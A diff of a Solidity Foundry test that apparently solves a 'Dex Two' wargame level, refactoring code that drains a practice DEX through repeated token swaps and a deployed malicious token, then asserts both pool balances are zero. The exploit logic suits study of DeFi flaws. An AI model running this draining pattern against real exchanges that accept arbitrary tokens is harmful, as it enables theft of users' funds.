@@ -32,18 +32,13 @@ contract DexTwoTest is Test {
         IERC20(address(swappabletokenB)).transfer(attacker, 10);
     }
 
-    function test_swap2Token() public {
-        console.log("\n===============BEFORE ATTACK======================\n");
+    function test_drainDex2() public {
+        console.log("\n===============BEFORE ATTACK DEX 2======================\n");
 
-        uint256 initialDexTwoBalA = swappabletokenA.balanceOf(address(dexTwo));
-        uint256 initialDexTwoBalB = swappabletokenB.balanceOf(address(dexTwo));
-        uint256 initialAttackerBalA = swappabletokenA.balanceOf(attacker);
-        uint256 initialAttackerBalB = swappabletokenB.balanceOf(attacker);
-
-        console.log("Initial DexTwo Token A Bal ", initialDexTwoBalA);
-        console.log("Initial DexTwo Token B Bal ", initialDexTwoBalB);
-        console.log("Initial Attacker Token A Bal ", initialAttackerBalA);
-        console.log("Initial Attacker Token B Bal ", initialAttackerBalB);
+        console.log("Initial DexTwo Token A Bal ", _dexTwoTokenABal());
+        console.log("Initial DexTwo Token B Bal ", _dexTwoTokenBBal());
+        console.log("Initial Attacker Token A Bal ", _attackerTokenABal());
+        console.log("Initial Attacker Token B Bal ", _attackerTokenBBal());
 
         console.log("\n===============STARTING ATTACK...======================\n");
 
@@ -53,23 +48,16 @@ contract DexTwoTest is Test {
         dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 10);
 
         uint256 count;
-
         while (_dexTwoTokenABal() > _getSwapAmountFromBToA()) {
             console.log("Running round ", ++count, "...");
-            if (_attackerTokenBBal() == 0) {
-                break;
-            }
-            dexTwo.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker));
-
-            if (_dexTwoTokenBBal() > _getSwapAmountFromAToB()) {
-                dexTwo.swap(address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker));
-            }
+            dexTwo.swap(address(swappabletokenB), address(swappabletokenA), _attackerTokenBBal());
+            dexTwo.swap(address(swappabletokenA), address(swappabletokenB), _attackerTokenABal());
             console.log("Round ", count, " completed");
         }
 
         console.log("\nOut of the loop!!!\n");
 
-        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(address(dexTwo)));
+        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), _dexTwoTokenBBal());
 
         console.log("Deploying and using malicious token to drain left over...\n");
 
@@ -78,45 +66,35 @@ contract DexTwoTest is Test {
         maliciousToken.transfer(address(dexTwo), 100);
         dexTwo.swap(address(maliciousToken), address(swappabletokenB), maliciousToken.balanceOf(address(dexTwo)));
 
-        uint256 AfterSwapDexTwoBalA = swappabletokenA.balanceOf(address(dexTwo));
-        uint256 AfterSwapDexTwoBalB = swappabletokenB.balanceOf(address(dexTwo));
-
-        console.log("DexTwo Token A Bal After Attack", AfterSwapDexTwoBalA);
-        console.log("DexTwo Token B Bal After Attack", AfterSwapDexTwoBalB);
-        console.log("Attacker Token A Bal After Attack", swappabletokenA.balanceOf(attacker));
-        console.log("Attacker Token B Bal After Attack", swappabletokenB.balanceOf(attacker));
-
-        console.log("\n===============END OF ATTACK======================\n");
-        console.log("count", count);
-
+        console.log("DexTwo Token A Bal After Attack", _dexTwoTokenABal());
+        console.log("DexTwo Token B Bal After Attack", _dexTwoTokenBBal());
+        console.log("Attacker Token A Bal After Attack", _attackerTokenABal());
+        console.log("Attacker Token B Bal After Attack", _attackerTokenBBal());
+        console.log("\n===============END OF DEX 2 ATTACK======================\n");
         vm.stopPrank();
 
-        assertEq(AfterSwapDexTwoBalA, 0);
-        assertEq(AfterSwapDexTwoBalB, 0);
+        assertEq(_dexTwoTokenABal(), 0);
+        assertEq(_dexTwoTokenBBal(), 0);
     }
 
-    function _dexTwoTokenABal() internal view returns (uint256) {
+    function _dexTwoTokenABal() private view returns (uint256) {
         return swappabletokenA.balanceOf(address(dexTwo));
     }
 
-    function _dexTwoTokenBBal() internal view returns (uint256) {
+    function _dexTwoTokenBBal() private view returns (uint256) {
         return swappabletokenB.balanceOf(address(dexTwo));
     }
 
-    function _attackerTokenBBal() internal view returns (uint256) {
+    function _attackerTokenABal() private view returns (uint256) {
+        return swappabletokenA.balanceOf(attacker);
+    }
+
+    function _attackerTokenBBal() private view returns (uint256) {
         return swappabletokenB.balanceOf(attacker);
     }
 
-    function _getSwapAmountFromBToA() internal view returns (uint256) {
-        return dexTwo.getSwapAmount(
-            address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker)
-        );
-    }
-
-    function _getSwapAmountFromAToB() internal view returns (uint256) {
-        return dexTwo.getSwapAmount(
-            address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker)
-        );
+    function _getSwapAmountFromBToA() private view returns (uint256) {
+        return dexTwo.getSwapAmount(address(swappabletokenB), address(swappabletokenA), _attackerTokenBBal());
     }
 }
 
